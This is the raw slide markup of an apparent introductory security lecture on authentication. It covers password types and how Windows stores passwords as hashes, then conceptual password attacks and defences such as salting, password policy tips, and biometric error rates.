              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="22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5"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Password Types </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1026"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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Static passwords </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>always remain the same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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Dynamic passwords </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>change after a specified interval of time or use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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>One-time passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> or single-use passwords are a variant of dynamic passwords that change every time they are used</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7"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Password Types</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1028"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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Cognitive password </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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A series of questions about facts or predefined responses that only the subject should know. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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For example, three to five questions might be asked of the subject, such as the following:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>What is your birth date?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>What is your mother’s name?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>What is the name of your division manager?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>What was your score on your last evaluation exam?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Who was your favorite player in the 1984 World Series?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="18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9"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Storing Passwords</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1030"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Reversible versus irreversible encryption</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1"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How Passwords is stored?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1032"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a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1033" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1152360" y="2081160"/>
            <a:ext cx="6838560" cy="3914280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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How Windows Stores Passwords?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1035"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LM “hashes”</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Old technology used on LAN Manager</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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NT hashes</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MD4 hash</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Used for authentication on more recent Windows systems</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Password Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1037"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Network traffic analysis </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Brute-force attacks</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Dictionary attacks</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4666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Try different passwords from a list</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4666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Succeeds only with poor passwords</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4666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Very fast</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Pre-computation Brute force attacks (Rainbow tables) </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Hybrid attacks</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4666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Start with Dictionary</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Insert entropy</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Append a symbol</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Append a number</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Relatively fast</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="16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Social-engineering attack</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="18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Password Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1039"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Brute Force Attacks </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Try all possible passwords</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>More commonly, a subset thereof</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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Usually implemented with progressive complexity</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Very slow</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All passwords will eventually be found</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="22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0"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Rainbow Tables</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1041"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Pre-compute hashes into sorted table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Trade CPU for memory</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Takes a lot of time to pre-compute, but makes cracking a hundred times faster</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Pre-computation Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1043"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Preventing pre-computation attack:</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Prevent hashes from being exact representations of passwords</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Unix -&gt; salted MD5</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Windows -&gt; NTLMv2 uses domain name, server challenge and other variables to randomize final hash to protect against pre-computation</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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 name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7772040" cy="990360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>How to increase password security?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1045"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Use the strongest form of one-way encryption available for password storage.</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Never allow passwords to be transmitted over the network in clear text or with weak encryption.</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Use password verification tools and password-cracking tools against your own password database file. </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Disable user accounts for short periods of inactivity, such as a week or a month. </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Delete accounts that are no longer used.</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Properly train users about the necessity of maintaining security and the use of strong passwords. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="18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Tips on creating passwords</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1047" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="4343040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:normAutofit fontScale="97000"/>
          </a:bodyPr>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Require that users change passwords consistently. </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Never display passwords in clear form on any screen or within any form. </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Longer passwords, such as those with 16 characters or more, are harder for a brute-force password-cracking tool to discover. However, it’s harder for people to remember longer passwords, which often leads users to write them down. Your organization should have a standard security awareness rule that no passwords should ever be written down. </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Create lists of passwords users should avoid. Easy-to-memorize passwords are often easily discovered by password-cracking tools.</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If the root or administrator password is ever compromised, every password on every account should be changed. </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Passwords should be handed out in person after the user has proved their identity. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Never transmit passwords via email.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="18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Passwords Cracking Tools</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1049"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Cain and Able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John the Ripper </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Biometrics</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1051"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a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>something you are,” authentication category</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Biometric factor is a behavioral or physiological characteristic that is unique to a subject.</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Examples: fingerprints, face scans, iris scans, retina scans, hand geometry, heart/pulse patterns, voice patterns, signature dynamics, and keystroke patterns (keystroke dynamics).</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2"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Biometric Factor Ratings</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1053"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Biometric devices are rated for performance in producing false negative and false positive authentications.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Most biometric devices have a sensitivity adjustment so they can be tuned to be more or less sensitive. </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Biometrics Errors</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1055"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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Type 1 Error</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A valid subject is not authenticated</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Occurs when a biometric device is too sensitive</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>False Rejection Rate (</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="7030a0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>FRR</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Type 2 Error </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An invalid subject is authenticated</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Occurs when a biometric device is less sensitive</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False Acceptance Rate (</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="7030a0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>FAR</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="22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Biometric Device Sensitivity</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1057" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="3809520" cy="4343040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1058" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4648320" y="1752480"/>
